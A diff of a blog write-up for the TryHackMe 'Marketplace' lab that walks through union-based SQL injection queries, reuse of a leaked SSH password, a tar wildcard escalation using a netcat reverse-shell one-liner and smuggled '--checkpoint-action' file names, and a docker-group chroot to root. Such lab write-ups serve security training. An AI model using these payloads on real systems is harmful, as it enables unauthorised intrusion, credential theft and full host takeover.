@@ -5,8 +5,6 @@ published: true
 
 Today I bring you the writeup of [marketplace](https://tryhackme.com/room/marketplace), a tryhackme machine focused on web exploitation, here we go!
 
-## [](#header-2)Information Gathering
-
 First we start with a port scan to see which ports are open.
 
 ```shell
@@ -128,3 +126,78 @@ user=0 union select 1,group_concat(0x7c,table_name,0x7c),3,4 from information_sc
 
 ![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/tablas.png)
 
+We see a messages table that seems quite interesting since the others are in the admin panel itself, at least, apparently.
+
+```shell
+user=0 union select 1,group_concat(0x7c,column_name,0x7c),3,4 from information_schema.columns where table_name='messages'-- -
+```
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/nombre de columnas de tabla mensajes.png)
+
+Let's take a look at the message_content to see if it has anything interesting.
+
+```shell
+user=0 union select 1,group_concat(0x7c,message_content,0x7c),3,4 from marketplace.messages-- -
+```
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/contenido de los mensajes, donde hay ssh password.png)
+
+We see a password, and we have several usernames of accounts created before ours which are:
+system
+michael
+jake
+
+Let's try to connect via ssh to those accounts.
+
+```shell
+ssh jake@IP
+```
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/shell con jake.png)
+
+Let's look at the sudo permissions you have.
+
+```shell
+sudo -l
+```
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/sudo -l jake.png)
+
+We see that you have permissions with the user michael in a script, if we read that script we see that it makes a backup of everything in the /opt/backups folder.
+
+To escalate privileges to michael we can use the [wildcards](https://book.hacktricks.xyz/linux-unix/privilege-escalation/wildcards-spare-tricks#tar) of tar so that we get a reverse when we make the backup.
+
+```shell
+nc -lvp PORT
+```
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/abrimos puerto.png)
+
+```shell
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f" > shell.sh
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+chmod 777 shell.sh
+chmod 777 backup.tar
+sudo -u michael /opt/backups/backup.sh
+```
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/comandos_movimiento_lateral.png)
+
+We get the reverse and we are already michael.
+
+```shell
+id
+```
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/grupo docker para escalar.png)
+
+We see that it is inside the [docker](https://gtfobins.github.io/gtfobins/docker/#shell) group, let's use that to escalate privileges.
+
+```shell
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/marketplace_writeup/escalada a root.png)
+
+And that's all! thanks for reading.
